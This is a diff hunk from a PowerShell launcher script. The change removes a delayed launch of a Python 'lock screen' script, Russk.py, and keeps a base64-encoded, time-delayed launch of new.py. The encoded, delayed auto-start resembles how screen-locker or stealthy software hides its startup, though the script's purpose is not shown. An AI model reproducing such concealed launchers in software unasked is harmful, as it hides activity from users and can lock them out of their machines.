@@ -17,24 +17,18 @@ if ([string]::IsNullOrWhiteSpace($currentExecutable)) {
     $currentExecutable = Join-Path $PSHOME "pwsh.exe"
 }
 
-$lockScreenScriptPath = Join-Path $PSScriptRoot "Russk.py"
 $newScriptPath = Join-Path $PSScriptRoot "new.py"
 $pythonCommand = Get-Command python -ErrorAction SilentlyContinue
 if (-not $pythonCommand) {
     $pythonCommand = Get-Command py -ErrorAction SilentlyContinue
 }
-if ($pythonCommand -and ((Test-Path -LiteralPath $newScriptPath) -or (Test-Path -LiteralPath $lockScreenScriptPath))) {
+if ($pythonCommand -and (Test-Path -LiteralPath $newScriptPath)) {
     $pythonExecutable = $pythonCommand.Source.Replace("'", "''")
     $newScriptPath = $newScriptPath.Replace("'", "''")
-    $lockScreenScriptPath = $lockScreenScriptPath.Replace("'", "''")
     $launchCommand = @"
 Start-Sleep -Seconds 5
 if (Test-Path -LiteralPath '$newScriptPath') {
     Start-Process -FilePath '$pythonExecutable' -ArgumentList @('$newScriptPath')
-}
-Start-Sleep -Seconds 15
-if (Test-Path -LiteralPath '$lockScreenScriptPath') {
-    Start-Process -FilePath '$pythonExecutable' -ArgumentList @('$lockScreenScriptPath')
 }
 "@
     $encodedLaunchCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($launchCommand))
